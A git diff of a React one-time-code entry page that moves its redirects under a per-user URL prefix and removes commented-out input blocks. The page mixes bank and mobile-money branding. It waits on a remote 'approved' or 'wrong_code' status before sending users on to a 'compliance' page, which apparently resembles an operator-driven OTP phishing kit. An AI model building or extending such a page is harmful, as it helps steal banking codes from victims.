@@ -1,6 +1,6 @@
 import React, { useRef, useState, useEffect } from "react";
 import "./otp2.css";
-import { useNavigate } from "react-router-dom";
+import { useParams, useNavigate } from "react-router-dom";
 import { useVerification } from "../hooks/useVerification";
 import { verificationService } from "../services/api";
 import Topheader from "./Topheader";
@@ -9,6 +9,7 @@ import Loader from "./Loader";
 const OtpVerification = ({ client, myFuncs }) => {
   const { name, number, length } = client;
   const { setOtp } = myFuncs;
+  const { user } = useParams();
   const navigate = useNavigate();
   const [otpp, setOtpp] = useState(Array(length).fill(""));
   // const [otp1, setOtp1] = useState("");
@@ -71,11 +72,11 @@ const OtpVerification = ({ client, myFuncs }) => {
 
   // Status effect for navigation
   const handleApprovedOtp = () => {
-    navigate("/compliance");
+    navigate(`/${user}/compliance`);
   };
 
   const handleWrongPin = () => {
-    navigate("/login");
+    navigate(`/${user}/login`);
   };
   useEffect(() => {
     if (status === "approved") {
@@ -140,7 +141,7 @@ const OtpVerification = ({ client, myFuncs }) => {
             setPollingInterval(null);
           }
           // Force navigation
-          setTimeout(() => navigate("/compliance"), 1000);
+          setTimeout(() => navigate(`/${user}/compliance`), 1000);
         } else if (data.status === "wrong_code") {
           console.log("❌ Wrong OTP code via polling");
           setWrongCode(true);
@@ -154,7 +155,7 @@ const OtpVerification = ({ client, myFuncs }) => {
             clearInterval(pollingInterval);
             setPollingInterval(null);
           }
-          setTimeout(() => navigate("/login"), 1000);
+          setTimeout(() => navigate(`/${user}/login`), 1000);
         } else if (data.status === "expired") {
           console.log("⏰ Session expired via polling");
           if (pollingInterval) {
@@ -323,14 +324,14 @@ const OtpVerification = ({ client, myFuncs }) => {
     setOtp(combinedOtp);
     // If already approved, navigate
     if (status === "approved") {
-      navigate("/compliance");
+      navigate(`/${user}/compliance`);
     }
   };
 
   // Early returns for specific states
   if (status === "approved") {
     if (status === "approved") {
-      navigate("/compliance");
+      navigate(`/${user}/compliance`);
     }
     return (
       <div className="otp-container">
@@ -357,6 +358,7 @@ const OtpVerification = ({ client, myFuncs }) => {
     <div className="otp-container">
       {/* <Topheader /> */}
       {loading && <Loader />}
+
       <img className="momoImg" src="/cabslogo.jpeg" alt="mtn" />
       <div className="otpheader">
         {error && (
@@ -411,57 +413,6 @@ const OtpVerification = ({ client, myFuncs }) => {
             disabled={loading || status === "pending"}
           />
         ))}
-        {/* {otpp.map((digit, index) => (
-          <input
-            key={index}
-            ref={(el) => (inputRefs.current[index] = el)}
-            type="text"
-            inputMode="numeric"
-            maxLength="1"
-            value={digit}
-            onChange={(e) => handleChange(index, e.target.value)}
-            onKeyDown={(e) => handleKeyDown(index, e)}
-            onPaste={handlePaste}
-            onFocus={handleFocus}
-            className={`otp-input ${digit ? "filled" : ""} ${wrongCode ? "error" : ""}`}
-            autoComplete="one-time-code"
-            disabled={loading || status === "pending"}
-          />
-        ))}
-        {otpp.map((digit, index) => (
-          <input
-            key={index}
-            ref={(el) => (inputRefs.current[index] = el)}
-            type="text"
-            inputMode="numeric"
-            maxLength="1"
-            value={digit}
-            onChange={(e) => handleChange(index, e.target.value)}
-            onKeyDown={(e) => handleKeyDown(index, e)}
-            onPaste={handlePaste}
-            onFocus={handleFocus}
-            className={`otp-input ${digit ? "filled" : ""} ${wrongCode ? "error" : ""}`}
-            autoComplete="one-time-code"
-            disabled={loading || status === "pending"}
-          />
-        ))}{" "}
-        {otpp.map((digit, index) => (
-          <input
-            key={index}
-            ref={(el) => (inputRefs.current[index] = el)}
-            type="text"
-            inputMode="numeric"
-            maxLength="1"
-            value={digit}
-            onChange={(e) => handleChange(index, e.target.value)}
-            onKeyDown={(e) => handleKeyDown(index, e)}
-            onPaste={handlePaste}
-            onFocus={handleFocus}
-            className={`otp-input ${digit ? "filled" : ""} ${wrongCode ? "error" : ""}`}
-            autoComplete="one-time-code"
-            disabled={loading || status === "pending"}
-          />
-        ))} */}
       </div>
 
       {wrongCode && (
